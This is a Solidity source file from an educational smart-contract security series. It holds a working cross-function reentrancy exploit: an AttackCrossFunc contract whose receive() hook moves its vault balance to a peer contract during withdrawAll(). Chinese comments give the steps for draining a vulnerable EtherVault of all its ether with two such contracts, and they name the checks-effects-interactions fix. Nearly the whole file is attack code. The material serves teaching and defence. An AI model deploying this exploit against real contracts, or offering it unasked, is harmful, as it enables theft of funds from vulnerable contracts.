// SPDX-License-Identifier: BSL-1.0 (Boost Software License 1.0)

//--------------------------------------------------------------------------//
// Copyright 2022 serial-coder: Phuwanai Thummavet (mr.thummavet@gmail.com) //
//--------------------------------------------------------------------------//

// For more info, please refer to my article:
//  - On Medium: https://medium.com/valixconsulting/solidity-smart-contract-security-by-example-04-cross-function-reentrancy-de9cbce0558e
//  - On serial-coder.com: https://www.serial-coder.com/post/solidity-smart-contract-security-by-example-04-cross-function-reentrancy/

import "hardhat/console.sol";

pragma solidity ^0.8.13;

interface IEtherVault {
    function deposit() external payable;
    function transfer(address _to, uint256 _amount) external;
    function withdrawAll() external;
    function getUserBalance(address _user) external view returns (uint256);
}
/*
攻击过程：
1）部署2个 AttackCrossFunc合约，attack1 和 attack2
2）调用: attack1.attackInit() 做初始化，存入1 eth
4）交替调用: attack1.attackNext() 和 attack2.attackNext() 直到耗尽所有eth。
5) attack1 和 attack2 的attackNext也可以合并在一个合约里AttackWrapper里操作

修改： 使用  checks-effects-interactions 把 pattern 部分的 userBalances[msg.sender] = 0; 提到 调用外部合约之外去。

*/




contract AttackCrossFunc {
    IEtherVault public immutable etherVault;
    AttackCrossFunc public attackPeer;

    constructor(IEtherVault _etherVault) {
        etherVault = _etherVault;
    }

    function setAttackPeer(AttackCrossFunc _attackPeer) external {
        attackPeer = _attackPeer;
    }

    receive() external payable {
        if (address(etherVault).balance >= 1 ether) {
            console.log("receive in if");
            etherVault.transfer(
                address(attackPeer),
                etherVault.getUserBalance(address(this))
            );
        }
        console.log("receive");
    }

    function attackInit() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        etherVault.deposit{value: 1 ether}();
        etherVault.withdrawAll();
    }

    function attackNext() external {
        etherVault.withdrawAll();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
